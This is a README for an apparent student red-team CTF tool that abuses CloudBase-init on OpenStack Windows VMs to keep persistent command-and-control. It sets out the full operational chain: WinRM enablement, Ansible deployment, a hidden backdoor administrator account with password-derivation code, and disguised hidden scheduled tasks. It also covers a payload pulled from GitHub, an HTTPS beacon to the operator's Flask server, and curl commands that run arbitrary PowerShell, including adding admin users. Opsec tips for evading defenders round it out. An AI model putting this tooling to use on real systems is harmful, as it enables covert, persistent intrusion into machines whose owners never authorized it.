# CDT Red Team Tool - CloudBase-Init C2 with Persistent Backdoor

## Overview

This tool is a red team command and control framework designed for use against
Windows 10 and 11 virtual machines running in an OpenStack environment. It
exploits CloudBase-init, a legitimate cloud initialization service present on
every OpenStack Windows instance, to establish persistence and deliver payloads
automatically on every service execution. Once deployed, the tool creates a
hidden administrator backdoor account, establishes a persistent HTTPS beacon
back to the operator's Kali machine, and sets up redundant scheduled tasks that
maintain access even if individual components are removed by the blue team.

The tool fits into the **persistence and command and control** categories of
the MITRE ATT&CK framework. The high-level approach is: Ansible deploys
scripts into CloudBase-init's LocalScripts directory over WinRM, CloudBase-init
executes them automatically, the scripts establish persistence and pull a live
payload from GitHub, and the payload beacons back to a Flask-based HTTPS C2
server running on the operator's Kali machine. Because the payload is pulled
fresh from GitHub on every execution, the operator can update capabilities
at any time by pushing to the repository without redeploying via Ansible.

This is useful for red team operations because it leverages a trusted system
service as the execution vehicle, hides backdoor accounts from the Windows
login screen, uses HTTPS on port 443 for C2 traffic to blend in with normal
web traffic, and implements layered persistence so removing one mechanism
does not evict the operator from the target.

---

## Requirements

### Target
- Windows 10 or Windows 11 (tested on Windows 11 in OpenStack CyberRange)
- CloudBase-init installed and present as a service
- PowerShell 5.1 or later (default on all Windows 10/11 installations)
- An account with Administrator privileges for initial WinRM setup

### Operator Machine
- Kali Linux 2025 (tested) or any Debian-based Linux distribution
- Network access to the OpenStack environment via the CyberRange jump host
- The following tools and libraries installed by `setup_kali.sh`:

| Dependency | Purpose | Install |
|---|---|---|
| ansible | Deploys scripts to Windows targets over WinRM | `sudo apt install ansible` |
| ansible.windows | Ansible collection providing win_* modules | `ansible-galaxy collection install ansible.windows` |
| pywinrm | Python WinRM library used by Ansible | `pip install pywinrm --break-system-packages` |
| flask | Web framework for the C2 server | `pip install flask --break-system-packages` |
| openssl | Generates TLS certificate for C2 HTTPS | Pre-installed on Kali |
| git | Clones repo and pulls payload updates | `sudo apt install git` |
| nmap | Network discovery for finding targets | `sudo apt install nmap` |

### Privileges Required
- **Operator machine (Kali):** Regular user for most operations, root required
  only to start `c2_server.py` on port 443
- **Windows target:** Administrator account required for WinRM setup and
  initial deployment. The tool creates its own backdoor administrator account
  during deployment so the original credentials are only needed once.

---

## Installation

### On the Windows Target (one time only)

Open PowerShell as Administrator and paste this single line:
```powershell
winrm quickconfig -force; netsh advfirewall firewall add rule name="WinRM HTTPS" dir=in action=allow protocol=TCP localport=5986; winrm set winrm/config/service/auth '@{Basic="true"}'
```

Then note the machine's IP address:
```powershell
ipconfig
```

### On the Kali Machine

Clone the repo and run the one-time setup script:
```bash
cd ~
git clone https://github.com/BSparacio/CDT_Red_Team_Tool.git
cd CDT_Red_Team_Tool
chmod +x setup_kali.sh deploy.sh
./setup_kali.sh
```

`setup_kali.sh` will automatically install all dependencies, generate a
TLS certificate for the C2 server, and detect and inject the Kali IP into
`payload.ps1`. No manual configuration is required.

### Deploy to Target
```bash
./deploy.sh <WINDOWS_IP>
```

Replace `<WINDOWS_IP>` with the IP noted from `ipconfig` on the Windows
machine. The script handles everything from this point automatically.

### Verifying Successful Installation

After `deploy.sh` completes, verify the full chain using these Ansible commands:
```bash
# Confirm scripts landed in CloudBase-init LocalScripts
ansible windows -i inventory.ini -m win_shell -a "Get-ChildItem 'C:\Program Files\Cloudbase Solutions\Cloudbase-Init\LocalScripts\'"

# Confirm backdoor user was created and has admin rights
ansible windows -i inventory.ini -m win_shell -a "Get-LocalGroupMember -Group Administrators | Format-List"

# Confirm scheduled tasks are registered
ansible windows -i inventory.ini -m win_shell -a "Get-ScheduledTask -TaskName 'ssh-scoring-check' | Format-List"
ansible windows -i inventory.ini -m win_shell -a "Get-ScheduledTask -TaskName 'service-health-monitor' | Format-List"

# Confirm hidden working directory has watchdog script
ansible windows -i inventory.ini -m win_shell -a "Get-ChildItem 'C:\Windows\System32\spool\drivers\color\'"
```

A successful deployment shows both scripts in LocalScripts, `cloudbase-init1`
in the Administrators group, both scheduled tasks in Ready state, and
`drv.ps1` present in the color directory.

---

## Usage

### Starting the C2 Server

The C2 server is started automatically by `deploy.sh`. To start it manually:
```bash
sudo python3 c2_server.py
```

The server listens on port 443 over HTTPS. Beacon check-ins from compromised
targets appear every 30 seconds in the format:
```
100.65.X.X - - [date] "POST /beacon HTTP/1.1" 200 -
[DEBUG] Beacon received from agent_id: 'CLOUDBASE-INIT0'
[DEBUG] Sending command to CLOUDBASE-INIT0: 'None'
```

### Issuing Commands

Get the target hostname first if you do not know it:
```bash
ansible windows -i inventory.ini -m win_shell -a "hostname"
```

Then issue any PowerShell command from a separate terminal:
```bash
curl -sk -X POST https://localhost/issue \
  -H "Content-Type: application/json" \
  -d '{"id": "HOSTNAME", "cmd": "whoami"}'
```

The result appears in the C2 server terminal within 30 seconds:
```
[CLOUDBASE-INIT0] Result:
nt authority\system
```

### Basic Usage Examples
```bash
# Check current user context
curl -sk -X POST https://localhost/issue \
  -H "Content-Type: application/json" \
  -d '{"id": "CLOUDBASE-INIT0", "cmd": "whoami"}'

# List all local users
curl -sk -X POST https://localhost/issue \
  -H "Content-Type: application/json" \
  -d '{"id": "CLOUDBASE-INIT0", "cmd": "Get-LocalUser | Format-List"}'

# Get network configuration
curl -sk -X POST https://localhost/issue \
  -H "Content-Type: application/json" \
  -d '{"id": "CLOUDBASE-INIT0", "cmd": "ipconfig /all"}'
```

### Advanced Usage Examples
```bash
# List running processes
curl -sk -X POST https://localhost/issue \
  -H "Content-Type: application/json" \
  -d '{"id": "CLOUDBASE-INIT0", "cmd": "Get-Process | Format-Table"}'

# Read a sensitive file
curl -sk -X POST https://localhost/issue \
  -H "Content-Type: application/json" \
  -d '{"id": "CLOUDBASE-INIT0", "cmd": "Get-Content C:\\Users\\cyberrange\\Desktop\\flag.txt"}'

# Create a new admin user manually
curl -sk -X POST https://localhost/issue \
  -H "Content-Type: application/json" \
  -d '{"id": "CLOUDBASE-INIT0", "cmd": "net user hacker P@ss123! /add; net localgroup Administrators hacker /add"}'

# Push a new payload to GitHub then force immediate re-execution on target
curl -sk -X POST https://localhost/issue \
  -H "Content-Type: application/json" \
  -d '{"id": "CLOUDBASE-INIT0", "cmd": "Start-ScheduledTask -TaskName ssh-scoring-check"}'
```

### Deploying to Multiple Targets

Each target requires its own deployment. Update the IP and redeploy:
```bash
./deploy.sh <SECOND_WINDOWS_IP>
```

Commands are routed to specific targets by hostname so multiple agents
can be active simultaneously with no conflicts.

### Calculating Backdoor Password

If you need to authenticate directly as the `cloudbase-init1` backdoor account:
```python
# python3 calc_password.py
import hashlib, base64

seed     = "redteam-rit-2026"
hostname = "hostname-here"    # lowercase hostname of the target

data       = (seed + hostname).encode("utf-8")
hash_bytes = hashlib.sha256(data).digest()
password   = base64.b64encode(hash_bytes).decode()[:16] + "!A1"

print(f"Backdoor password: {password}")
```

---

## Operational Notes

### Competition Workflow

The total time from receiving access to having a working C2 on a target
is approximately 3-5 minutes following this sequence:

1. Paste the WinRM one-liner on the Windows target and note the IP
2. Run `./setup_kali.sh` on Kali (first time only, ~2 minutes)
3. Run `./deploy.sh <WINDOWS_IP>` and wait for the 45 second pause
4. Use the curl command printed by `deploy.sh` to issue commands

On subsequent targets only steps 1 and 3 are needed.

### Pushing Updated Payloads

Since `payload.ps1` is pulled from GitHub on every CloudBase-init run and
every 10 minute scheduled task execution, capabilities can be updated without
redeploying via Ansible. Push changes to the repo and they will be picked up
automatically on the next execution cycle.

### OpSec Considerations

The following artifacts are created on the target and may be detected by
blue team:

| Artifact | Location | Notes |
|---|---|---|
| WinRM firewall rule | Windows Firewall | Named `WinRM HTTPS`, visible in firewall rules |
| bootstrap.ps1 | CloudBase-init LocalScripts | Visible to anyone checking LocalScripts directory |
| cloudbase-init1 user | Local users | Hidden from login screen but visible in `Get-LocalUser` |
| ssh-scoring-check task | Task Scheduler | Hidden flag set but visible with `Get-ScheduledTask` |
| service-health-monitor task | Task Scheduler | Hidden flag set but visible with `Get-ScheduledTask` |
| drv.ps1 | C:\Windows\System32\spool\drivers\color | Low visibility location |
| beacon_log.txt | C:\Users\Public | Created during testing, remove before competition |
| proof.txt | C:\Users\Public | Created during testing, remove before competition |
| GitHub outbound requests | Network logs | Periodic requests to raw.githubusercontent.com |
| HTTPS beacon traffic | Network logs | Periodic POST requests to Kali IP on port 443 |

The most detectable artifacts are the outbound GitHub requests and the
HTTPS beacon traffic since these generate regular network activity. The
scheduled tasks use names designed to look like legitimate infrastructure
so blue team is hesitant to remove them.

### Cleanup and Removal

To remove all traces from a target if needed, issue these commands via the C2:
```bash
# Remove scheduled tasks
curl -sk -X POST https://localhost/issue \
  -H "Content-Type: application/json" \
  -d '{"id": "HOSTNAME", "cmd": "Unregister-ScheduledTask -TaskName ssh-scoring-check -Confirm:$false; Unregister-ScheduledTask -TaskName service-health-monitor -Confirm:$false"}'

# Remove backdoor user
curl -sk -X POST https://localhost/issue \
  -H "Content-Type: application/json" \
  -d '{"id": "HOSTNAME", "cmd": "Remove-LocalUser -Name cloudbase-init1"}'

# Remove working directory files
curl -sk -X POST https://localhost/issue \
  -H "Content-Type: application/json" \
  -d '{"id": "HOSTNAME", "cmd": "Remove-Item C:\\Windows\\System32\\spool\\drivers\\color\\drv.ps1 -Force"}'

# Remove LocalScripts
curl -sk -X POST https://localhost/issue \
  -H "Content-Type: application/json" \
  -d '{"id": "HOSTNAME", "cmd": "Remove-Item '\''C:\\Program Files\\Cloudbase Solutions\\Cloudbase-Init\\LocalScripts\\*'\'' -Force"}'
```

---

## Limitations

- **Single command queue per agent:** The C2 server holds only one pending
  command per agent at a time. Issuing a second command before the first is
  picked up overwrites it. Commands must be issued sequentially and the
  operator must wait up to 30 seconds between commands for results.

- **No persistent C2 session across reboots without scheduled task firing:**
  The beacon loop runs as a PowerShell process that dies on reboot. The
  `ssh-scoring-check` scheduled task restores it within 10 minutes but there
  is a gap in coverage immediately after a reboot.

- **GitHub dependency:** The payload pull requires outbound internet access
  from the target to GitHub. If the competition environment blocks outbound
  internet access the GitHub pull will fail silently and only the bootstrap
  functionality will work. In this scenario the beacon code would need to be
  moved into `bootstrap.ps1.j2` directly.

- **C2 server is single-threaded:** Flask's built-in development server handles
  one request at a time. With many simultaneous agents beaconing this could
  cause delays. For large scale operations a production WSGI server like
  gunicorn should be used instead.

**Known issues:**
- The CloudBase-init registry clear occasionally requires a full reboot to take effect on some machine configurations. If LocalScripts are not executing after deployment a reboot resolves it.
- The `setup_kali.sh` IP detection regex matches `100.x.x.x` and `10.x.x.x` addresses only. If the CyberRange network addressing changes the script will fail to detect the Kali IP and `payload.ps1` must be updated manually.

**Future improvements:**
- Add a proper operator console to `c2_server.py` to replace manual curl commands
- Implement command queuing so multiple commands can be issued without overwriting
- Add result persistence to a log file so output survives C2 server restarts
- Support multiple concurrent targets with a single interface
- Add automatic target discovery using nmap to find all Windows hosts on the network

---

## Credits & References

**Resources consulted:**
- [Ansible Windows Modules Documentation](https://docs.ansible.com/ansible/latest/collections/ansible/windows/)
- [CloudBase-init Documentation](https://cloudbase-init.readthedocs.io/en/latest/)
- [Microsoft WinRM Documentation](https://learn.microsoft.com/en-us/windows/win32/winrm/portal)
- [PowerShell Scheduled Tasks Reference](https://learn.microsoft.com/en-us/powershell/module/scheduledtasks/)
- [Flask Documentation](https://flask.palletsprojects.com/)

**Disclaimer:** This tool was developed exclusively for use in an authorized CTF competition environment. Use against systems without explicit authorization is illegal. The authors are not responsible for misuse.